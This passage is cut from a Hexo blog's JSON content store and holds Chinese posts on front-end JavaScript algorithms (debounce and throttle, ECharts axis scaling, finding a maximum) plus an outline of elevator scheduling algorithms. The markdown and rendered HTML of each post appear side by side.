class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echarts 支持callback函数</span><br><span class=\"line\">max: (&#123; max, min &#125;) =&gt; &#123;</span><br><span class=\"line\">  /** 判断最大值的长度 减一是因为 两位数只用 除10 即可，即保留十位上的为整数，以此类推 */</span><br><span class=\"line\">  let maxLen = max.toString().length - 1;</span><br><span class=\"line\"></span><br><span class=\"line\">  /** 取平方 */</span><br><span class=\"line\">  let pow = Math.pow(10, maxLen)</span><br><span class=\"line\">  let pow2 = Number(`10e$&#123;max.toString().length - 1&#125;`)</span><br><span class=\"line\"></span><br><span class=\"line\">  // 取整</span><br><span class=\"line\">  let ceilMax = Math.ceil(max / pow) * pow;</span><br><span class=\"line\">  this.state.max = ceilMax;</span><br><span class=\"line\">  this.state.min = min;</span><br><span class=\"line\">  return ceilMax</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">// 不支持 callback，可以 通过 state缓存 max 函数 中最大值计算</span><br><span class=\"line\">interval: (() =&gt; this.state.max / 5)(),</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"最大值-以及-分割数-计算\"><a href=\"#最大值-以及-分割数-计算\" class=\"headerlink\" title=\"最大值 以及 分割数 计算\"></a>最大值 以及 分割数 计算</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echarts 支持callback函数</span><br><span class=\"line\">max: (&#123; max, min &#125;) =&gt; &#123;</span><br><span class=\"line\">  /** 判断最大值的长度 减一是因为 两位数只用 除10 即可，即保留十位上的为整数，以此类推 */</span><br><span class=\"line\">  let maxLen = max.toString().length - 1;</span><br><span class=\"line\"></span><br><span class=\"line\">  /** 取平方 */</span><br><span class=\"line\">  let pow = Math.pow(10, maxLen)</span><br><span class=\"line\">  let pow2 = Number(`10e$&#123;max.toString().length - 1&#125;`)</span><br><span class=\"line\"></span><br><span class=\"line\">  // 取整</span><br><span class=\"line\">  let ceilMax = Math.ceil(max / pow) * pow;</span><br><span class=\"line\">  this.state.max = ceilMax;</span><br><span class=\"line\">  this.state.min = min;</span><br><span class=\"line\">  return ceilMax</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">// 不支持 callback，可以 通过 state缓存 max 函数 中最大值计算</span><br><span class=\"line\">interval: (() =&gt; this.state.max / 5)(),</span><br></pre></td></tr></table></figure>\n"},{"title":"函数防抖","date":"2019-01-18T08:41:13.000Z","_content":"# 函数防抖动\n鼠标移入事件的函数防抖方法\n````\n  /** HTML */\n  <div\n    class=\"getTitle\"\n    @mouseover=\"getTitleReq(scope)\"\n    @mouseout=\"clearTitleReq\"\n  ></div>\n\n  /** 指标完成率 获取数据行说明 */\n  getTitleReq(scope) {\n    // console.log('getTitleTimeout');\n    clearTimeout(this.getTitleTimeout)\n    this.getTitleTimeout = setTimeout(() => {\n      // debugger\n      // 请求接口 doSomething...\n    }, 500)\n  },\n\n  /** 指标完成率 清除获取数据行说明 */\n  clearTitleReq() {\n    // console.log('clearTimeout');\n    clearTimeout(this.getTitleTimeout)\n  },\n````\n","source":"_posts/Algorithm/函数防抖.md","raw":"---\ntitle: 函数防抖\ndate: 2019-01-18 16:41:13\ntags: 函数防抖\ncategories: Algorithm\n---\n# 函数防抖动\n鼠标移入事件的函数防抖方法\n````\n  /** HTML */\n  <div\n    class=\"getTitle\"\n    @mouseover=\"getTitleReq(scope)\"\n    @mouseout=\"clearTitleReq\"\n  ></div>\n\n  /** 指标完成率 获取数据行说明 */\n  getTitleReq(scope) {\n    // console.log('getTitleTimeout');\n    clearTimeout(this.getTitleTimeout)\n    this.getTitleTimeout = setTimeout(() => {\n      // debugger\n      // 请求接口 doSomething...\n    }, 500)\n  },\n\n  /** 指标完成率 清除获取数据行说明 */\n  clearTitleReq() {\n    // console.log('clearTimeout');\n    clearTimeout(this.getTitleTimeout)\n  },\n````\n","slug":"Algorithm/函数防抖","published":1,"updated":"2019-01-18T08:45:18.999Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuf002bzodvzfdm41j2","content":"<h1 id=\"函数防抖动\"><a href=\"#函数防抖动\" class=\"headerlink\" title=\"函数防抖动\"></a>函数防抖动</h1><p>鼠标移入事件的函数防抖方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** HTML */</span><br><span class=\"line\">&lt;div</span><br><span class=\"line\">  class=&quot;getTitle&quot;</span><br><span class=\"line\">  @mouseover=&quot;getTitleReq(scope)&quot;</span><br><span class=\"line\">  @mouseout=&quot;clearTitleReq&quot;</span><br><span class=\"line\">&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/** 指标完成率 获取数据行说明 */</span><br><span class=\"line\">getTitleReq(scope) &#123;</span><br><span class=\"line\">  // console.log(&apos;getTitleTimeout&apos;);</span><br><span class=\"line\">  clearTimeout(this.getTitleTimeout)</span><br><span class=\"line\">  this.getTitleTimeout = setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    // debugger</span><br><span class=\"line\">    // 请求接口 doSomething...</span><br><span class=\"line\">  &#125;, 500)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">/** 指标完成率 清除获取数据行说明 */</span><br><span class=\"line\">clearTitleReq() &#123;</span><br><span class=\"line\">  // console.log(&apos;clearTimeout&apos;);</span><br><span class=\"line\">  clearTimeout(this.getTitleTimeout)</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"函数防抖动\"><a href=\"#函数防抖动\" class=\"headerlink\" title=\"函数防抖动\"></a>函数防抖动</h1><p>鼠标移入事件的函数防抖方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** HTML */</span><br><span class=\"line\">&lt;div</span><br><span class=\"line\">  class=&quot;getTitle&quot;</span><br><span class=\"line\">  @mouseover=&quot;getTitleReq(scope)&quot;</span><br><span class=\"line\">  @mouseout=&quot;clearTitleReq&quot;</span><br><span class=\"line\">&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/** 指标完成率 获取数据行说明 */</span><br><span class=\"line\">getTitleReq(scope) &#123;</span><br><span class=\"line\">  // console.log(&apos;getTitleTimeout&apos;);</span><br><span class=\"line\">  clearTimeout(this.getTitleTimeout)</span><br><span class=\"line\">  this.getTitleTimeout = setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    // debugger</span><br><span class=\"line\">    // 请求接口 doSomething...</span><br><span class=\"line\">  &#125;, 500)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">/** 指标完成率 清除获取数据行说明 */</span><br><span class=\"line\">clearTitleReq() &#123;</span><br><span class=\"line\">  // console.log(&apos;clearTimeout&apos;);</span><br><span class=\"line\">  clearTimeout(this.getTitleTimeout)</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure></p>\n"},{"title":"延迟判断算法","date":"2018-10-26T08:20:06.000Z","_content":"# 延迟判断算法\n延迟判断 为了 降低 [vue,react] 框架中的, [onChange,click...] 事件\n````\n/** 组件内，函数外 缓存状态 */\nthis.state = {\n  cacheValueArr: []\n};\n\n/** 核心思想是：\n* 先缓存一次数据， \n* 定时器 2S 后 再缓存一次数据 \n* 对比判断 值 是否 相等，代表没有改变\n*/\nonChange(e) {\n  let cacheArr = this.state.cacheValueArr; // 先引用缓存的状态\n  let len = cacheArr.push(e); // push方法 会返回 长度，改变原数组\n  let lastOne = cacheArr.slice(-1); // 数组最后一位的 值\n\n  setTimeout(() => {\n    let lastLen = this.state.cacheValueArr.length; // 2S 后再缓存 长度有无变化\n    let lastOnes = this.state.cacheValueArr.slice(-1); // 2S 后再缓存 值有无变化\n    if (len === lastLen) {\n      this.setState({\n        curE: e\n      })\n      debugger\n    }\n  }, 2000);\n}\n```` \n\n# 函数防抖动\n````\n/**\n * Created by hjl on 2017/8/15.\n */\nvar throttle = function (func, interval) {\n  var self = func,\n    timer,\n    firstTime = true;\n\n  return function () {\n    var args = arguments,\n      me = this;\n    if (firstTime) {\n      self.apply(me, args);\n      return firstTime = false;\n    }\n    if (timer) {\n      return false;\n    }\n\n    timer = setTimeout(function () {\n      clearTimeout(timer);\n      timer = null;\n      self.apply(me, args);\n    }, interval || 3000);\n  };\n};\n````\n\n**借鉴方法**\n````\n /**\n  * 函数防抖\n  *\n  * @param {any} method 方法名\n  */\nfunction debounce(method) {\n  clearTimeout(method.tId);\n  method.tId = setTimeout(function() {\n    method.call();\n  }, 200);\n}\n````\n","source":"_posts/Algorithm/延迟判断算法.md","raw":"---\ntitle: 延迟判断算法\ndate: 2018-10-26 16:20:06\ntags: 延迟判断\ncategories: Algorithm\n---\n# 延迟判断算法\n延迟判断 为了 降低 [vue,react] 框架中的, [onChange,click...] 事件\n````\n/** 组件内，函数外 缓存状态 */\nthis.state = {\n  cacheValueArr: []\n};\n\n/** 核心思想是：\n* 先缓存一次数据， \n* 定时器 2S 后 再缓存一次数据 \n* 对比判断 值 是否 相等，代表没有改变\n*/\nonChange(e) {\n  let cacheArr = this.state.cacheValueArr; // 先引用缓存的状态\n  let len = cacheArr.push(e); // push方法 会返回 长度，改变原数组\n  let lastOne = cacheArr.slice(-1); // 数组最后一位的 值\n\n  setTimeout(() => {\n    let lastLen = this.state.cacheValueArr.length; // 2S 后再缓存 长度有无变化\n    let lastOnes = this.state.cacheValueArr.slice(-1); // 2S 后再缓存 值有无变化\n    if (len === lastLen) {\n      this.setState({\n        curE: e\n      })\n      debugger\n    }\n  }, 2000);\n}\n```` \n\n# 函数防抖动\n````\n/**\n * Created by hjl on 2017/8/15.\n */\nvar throttle = function (func, interval) {\n  var self = func,\n    timer,\n    firstTime = true;\n\n  return function () {\n    var args = arguments,\n      me = this;\n    if (firstTime) {\n      self.apply(me, args);\n      return firstTime = false;\n    }\n    if (timer) {\n      return false;\n    }\n\n    timer = setTimeout(function () {\n      clearTimeout(timer);\n      timer = null;\n      self.apply(me, args);\n    }, interval || 3000);\n  };\n};\n````\n\n**借鉴方法**\n````\n /**\n  * 函数防抖\n  *\n  * @param {any} method 方法名\n  */\nfunction debounce(method) {\n  clearTimeout(method.tId);\n  method.tId = setTimeout(function() {\n    method.call();\n  }, 200);\n}\n````\n","slug":"Algorithm/延迟判断算法","published":1,"updated":"2019-01-04T02:14:22.087Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuh002dzodv4wz9ynqr","content":"<h1 id=\"延迟判断算法\"><a href=\"#延迟判断算法\" class=\"headerlink\" title=\"延迟判断算法\"></a>延迟判断算法</h1><p>延迟判断 为了 降低 [vue,react] 框架中的, [onChange,click…] 事件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 组件内，函数外 缓存状态 */</span><br><span class=\"line\">this.state = &#123;</span><br><span class=\"line\">  cacheValueArr: []</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">/** 核心思想是：</span><br><span class=\"line\">* 先缓存一次数据， </span><br><span class=\"line\">* 定时器 2S 后 再缓存一次数据 </span><br><span class=\"line\">* 对比判断 值 是否 相等，代表没有改变</span><br><span class=\"line\">*/</span><br><span class=\"line\">onChange(e) &#123;</span><br><span class=\"line\">  let cacheArr = this.state.cacheValueArr; // 先引用缓存的状态</span><br><span class=\"line\">  let len = cacheArr.push(e); // push方法 会返回 长度，改变原数组</span><br><span class=\"line\">  let lastOne = cacheArr.slice(-1); // 数组最后一位的 值</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    let lastLen = this.state.cacheValueArr.length; // 2S 后再缓存 长度有无变化</span><br><span class=\"line\">    let lastOnes = this.state.cacheValueArr.slice(-1); // 2S 后再缓存 值有无变化</span><br><span class=\"line\">    if (len === lastLen) &#123;</span><br><span class=\"line\">      this.setState(&#123;</span><br><span class=\"line\">        curE: e</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">      debugger</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;, 2000);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```` </span><br><span class=\"line\"></span><br><span class=\"line\"># 函数防抖动</span><br></pre></td></tr></table></figure></p>\n<p>/**</p>\n<ul>\n<li><p>Created by hjl on 2017/8/15.<br>*/<br>var throttle = function (func, interval) {<br>var self = func,<br> timer,<br> firstTime = true;</p>\n<p>return function () {<br> var args = arguments,<br>   me = this;<br> if (firstTime) {<br>   self.apply(me, args);<br>   return firstTime = false;<br> }<br> if (timer) {<br>   return false;<br> }</p>\n<p> timer = setTimeout(function () {<br>   clearTimeout(timer);<br>   timer = null;<br>   self.apply(me, args);<br> }, interval || 3000);<br>};<br>};</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">**借鉴方法**</span><br></pre></td></tr></table></figure>\n<p>/**</p>\n<ul>\n<li>函数防抖<br>*</li>\n<li>@param {any} method 方法名<br>*/<br>function debounce(method) {<br>clearTimeout(method.tId);<br>method.tId = setTimeout(function() {<br>method.call();<br>}, 200);<br>}<br>````</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"延迟判断算法\"><a href=\"#延迟判断算法\" class=\"headerlink\" title=\"延迟判断算法\"></a>延迟判断算法</h1><p>延迟判断 为了 降低 [vue,react] 框架中的, [onChange,click…] 事件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 组件内，函数外 缓存状态 */</span><br><span class=\"line\">this.state = &#123;</span><br><span class=\"line\">  cacheValueArr: []</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">/** 核心思想是：</span><br><span class=\"line\">* 先缓存一次数据， </span><br><span class=\"line\">* 定时器 2S 后 再缓存一次数据 </span><br><span class=\"line\">* 对比判断 值 是否 相等，代表没有改变</span><br><span class=\"line\">*/</span><br><span class=\"line\">onChange(e) &#123;</span><br><span class=\"line\">  let cacheArr = this.state.cacheValueArr; // 先引用缓存的状态</span><br><span class=\"line\">  let len = cacheArr.push(e); // push方法 会返回 长度，改变原数组</span><br><span class=\"line\">  let lastOne = cacheArr.slice(-1); // 数组最后一位的 值</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    let lastLen = this.state.cacheValueArr.length; // 2S 后再缓存 长度有无变化</span><br><span class=\"line\">    let lastOnes = this.state.cacheValueArr.slice(-1); // 2S 后再缓存 值有无变化</span><br><span class=\"line\">    if (len === lastLen) &#123;</span><br><span class=\"line\">      this.setState(&#123;</span><br><span class=\"line\">        curE: e</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">      debugger</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;, 2000);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```` </span><br><span class=\"line\"></span><br><span class=\"line\"># 函数防抖动</span><br></pre></td></tr></table></figure></p>\n<p>/**</p>\n<ul>\n<li><p>Created by hjl on 2017/8/15.<br>*/<br>var throttle = function (func, interval) {<br>var self = func,<br> timer,<br> firstTime = true;</p>\n<p>return function () {<br> var args = arguments,<br>   me = this;<br> if (firstTime) {<br>   self.apply(me, args);<br>   return firstTime = false;<br> }<br> if (timer) {<br>   return false;<br> }</p>\n<p> timer = setTimeout(function () {<br>   clearTimeout(timer);<br>   timer = null;<br>   self.apply(me, args);<br> }, interval || 3000);<br>};<br>};</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">**借鉴方法**</span><br></pre></td></tr></table></figure>\n<p>/**</p>\n<ul>\n<li>函数防抖<br>*</li>\n<li>@param {any} method 方法名<br>*/<br>function debounce(method) {<br>clearTimeout(method.tId);<br>method.tId = setTimeout(function() {<br>method.call();<br>}, 200);<br>}<br>````</li>\n</ul>\n</li>\n</ul>\n"},{"title":"最大值算法","date":"2018-11-22T08:03:58.000Z","_content":"## 最大值\n\n````\n /** 计算最大数算法 1*/\n  let max = 0;\n  for (let i = 1; i < dataLen; i++) {\n    const item = ArrData[i];\n    const preItem = ArrData[i - 1]\n    item > preItem ?\n      item > max ? max = item : null\n      : preItem > max ? max = preItem : null\n  }\n````\n\n````\n /** 计算最大数算法 2*/\n  let max = 0;\n  for (let i = 0; i < dataLen; i++) {\n    const item = ArrData[i];\n    item > max ? max = item : null\n  }\n````","source":"_posts/Algorithm/最大值算法.md","raw":"---\ntitle: 最大值算法\ndate: 2018-11-22 16:03:58\ntags: 最大值\ncategories: Algorithm\n---\n## 最大值\n\n````\n /** 计算最大数算法 1*/\n  let max = 0;\n  for (let i = 1; i < dataLen; i++) {\n    const item = ArrData[i];\n    const preItem = ArrData[i - 1]\n    item > preItem ?\n      item > max ? max = item : null\n      : preItem > max ? max = preItem : null\n  }\n````\n\n````\n /** 计算最大数算法 2*/\n  let max = 0;\n  for (let i = 0; i < dataLen; i++) {\n    const item = ArrData[i];\n    item > max ? max = item : null\n  }\n````","slug":"Algorithm/最大值算法","published":1,"updated":"2019-01-21T07:26:07.319Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxui002fzodvzsn5gux0","content":"<h2 id=\"最大值\"><a href=\"#最大值\" class=\"headerlink\" title=\"最大值\"></a>最大值</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 计算最大数算法 1*/</span><br><span class=\"line\"> let max = 0;</span><br><span class=\"line\"> for (let i = 1; i &lt; dataLen; i++) &#123;</span><br><span class=\"line\">   const item = ArrData[i];</span><br><span class=\"line\">   const preItem = ArrData[i - 1]</span><br><span class=\"line\">   item &gt; preItem ?</span><br><span class=\"line\">     item &gt; max ? max = item : null</span><br><span class=\"line\">     : preItem &gt; max ? max = preItem : null</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 计算最大数算法 2*/</span><br><span class=\"line\"> let max = 0;</span><br><span class=\"line\"> for (let i = 0; i &lt; dataLen; i++) &#123;</span><br><span class=\"line\">   const item = ArrData[i];</span><br><span class=\"line\">   item &gt; max ? max = item : null</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"最大值\"><a href=\"#最大值\" class=\"headerlink\" title=\"最大值\"></a>最大值</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 计算最大数算法 1*/</span><br><span class=\"line\"> let max = 0;</span><br><span class=\"line\"> for (let i = 1; i &lt; dataLen; i++) &#123;</span><br><span class=\"line\">   const item = ArrData[i];</span><br><span class=\"line\">   const preItem = ArrData[i - 1]</span><br><span class=\"line\">   item &gt; preItem ?</span><br><span class=\"line\">     item &gt; max ? max = item : null</span><br><span class=\"line\">     : preItem &gt; max ? max = preItem : null</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 计算最大数算法 2*/</span><br><span class=\"line\"> let max = 0;</span><br><span class=\"line\"> for (let i = 0; i &lt; dataLen; i++) &#123;</span><br><span class=\"line\">   const item = ArrData[i];</span><br><span class=\"line\">   item &gt; max ? max = item : null</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>"},{"title":"电梯调度算法","date":"2018-05-07T02:08:18.000Z","archives":"Algorithm","_content":"# [电梯调度算法](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n## ---传统电梯调度算法---\n### 1.1 先来先服务算法（FCFS）\n\n  先来先服务（FCFS-First Come First Serve）算法\n\n### 1.2 最短寻找楼层时间优先算法（SSTF）\n\n### 1.3 扫描算法（SCAN）\n\n### 1.4 LOOK 算法\n\n### 1.5 SATF 算法\n\n## ---实时电梯调度算法---\n### 2.1 最早截止期优先调度算法\n\n### 2.2 SCAN-EDF 算法\n\n### 2.3 PI 算法\n\n### 2.4 FD-SCAN 算法\n\n## ---电梯调度高水平研究---\n以上两节介绍了几种简单的电梯调度算法。\n\n但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯`群控`的时代。\n\n随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。\n\n由此，电梯的`群控`方面陆续发展出了一批新方法，包括：\n基于`专家系统`的电梯群控方法、\n基于`模糊逻辑`的电梯群控方法、\n基于`遗产算法`的电梯群控方法、\n基于`神经网络`的电梯群控方法、\n基于`模糊神经网络`的电梯群控方法。\n\n## ---电梯问题的需求分析---\n\n### 4.1 电梯的初始状态\n\n### 4.2 电梯基本功能\n\n### 4.3 电梯按钮功能\n\n## 结束语\n\n可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。\n\n但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。\n\n[查看原文](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n另：\n[【知名互联网公司面试中常见的算法题】](https://www.zhihu.com/question/24964987)\n","source":"_posts/Algorithm/电梯调度算法.md","raw":"---\ntitle: 电梯调度算法\ndate: 2018-05-07 10:08:18\ntags: 调度算法\narchives: Algorithm\ncategories: 算法\n---\n# [电梯调度算法](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n## ---传统电梯调度算法---\n### 1.1 先来先服务算法（FCFS）\n\n  先来先服务（FCFS-First Come First Serve）算法\n\n### 1.2 最短寻找楼层时间优先算法（SSTF）\n\n### 1.3 扫描算法（SCAN）\n\n### 1.4 LOOK 算法\n\n### 1.5 SATF 算法\n\n## ---实时电梯调度算法---\n### 2.1 最早截止期优先调度算法\n\n### 2.2 SCAN-EDF 算法\n\n### 2.3 PI 算法\n\n### 2.4 FD-SCAN 算法\n\n## ---电梯调度高水平研究---\n以上两节介绍了几种简单的电梯调度算法。\n\n但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯`群控`的时代。\n\n随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。\n\n由此，电梯的`群控`方面陆续发展出了一批新方法，包括：\n基于`专家系统`的电梯群控方法、\n基于`模糊逻辑`的电梯群控方法、\n基于`遗产算法`的电梯群控方法、\n基于`神经网络`的电梯群控方法、\n基于`模糊神经网络`的电梯群控方法。\n\n## ---电梯问题的需求分析---\n\n### 4.1 电梯的初始状态\n\n### 4.2 电梯基本功能\n\n### 4.3 电梯按钮功能\n\n## 结束语\n\n可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。\n\n但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。\n\n[查看原文](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n另：\n[【知名互联网公司面试中常见的算法题】](https://www.zhihu.com/question/24964987)\n","slug":"Algorithm/电梯调度算法","published":1,"updated":"2018-09-05T06:33:18.440Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuj002gzodv1tp4l2tu","content":"<h1 id=\"电梯调度算法\"><a href=\"#电梯调度算法\" class=\"headerlink\" title=\"电梯调度算法\"></a><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">电梯调度算法</a></h1><h2 id=\"—传统电梯调度算法—\"><a href=\"#—传统电梯调度算法—\" 